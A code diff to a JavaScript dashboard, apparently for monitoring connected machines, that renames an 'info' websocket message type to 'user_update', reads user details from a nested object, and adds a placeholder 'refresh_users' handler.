@@ -111,19 +111,23 @@
                 else if (data.type === 'alert') {
                     addLog(data.message, data.message.includes('🟢') ? 'green' : 'red');
                 }
-                else if (data.type === 'info') {
-                    addLog(`🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`, 'green');
+                else if (data.type === 'user_update') {
+                    addLog(`🟢 New User: ${data.info.os || 'Unknown'} (${data.info.user || 'Unknown'})`, 'green');
 
                     // FIX: Prevent duplicates/spam
                     if (!users[data.id]) {
-                        users[data.id] = { status: 'Online', logs: [], info: data, lastSeen: Date.now(), sessionActive: false };
+                        users[data.id] = { status: 'Online', logs: [], info: data.info, lastSeen: data.lastSeen, sessionActive: false };
                     } else {
                         users[data.id].status = 'Online';
-                        users[data.id].info = data;
-                        users[data.id].lastSeen = Date.now();
+                        users[data.id].info = data.info;
+                        users[data.id].lastSeen = data.lastSeen;
                         users[data.id].sessionActive = false;
                     }
                     renderUsers();
+                } 
+                else if (data.type === 'refresh_users') {
+                    // Fetch all users from DB logic would go here if we had an API endpoint
+                    // For now, we rely on real-time updates
                 }
                 else if (data.type === 'heartbeat') {
                     if (users[data.id]) {
@@ -131,7 +135,7 @@
                         users[data.id].status = 'Online';
                         renderUsers();
                     }
-                }
+                } 
                 else if (data.type === 'system') {
                     addLog(data.message, "blue");
                 }
@@ -163,7 +167,7 @@
                     }
                 }
                 else {
-                    if (data.type !== 'registered' && data.type !== 'alert' && data.type !== 'info' && data.type !== 'screen_data' && data.type !== 'heartbeat' && data.type !== 'system' && data.type !== 'system_log') {
+                    if (data.type !== 'registered' && data.type !== 'alert' && data.type !== 'user_update' && data.type !== 'screen_data' && data.type !== 'heartbeat' && data.type !== 'system' && data.type !== 'system_log') {
                         addLog(`[${data.targetId || data.id}] Received: ${data.type}`, 'blue');
                         const userId = data.targetId || data.id;
                         if (!users[userId]) {
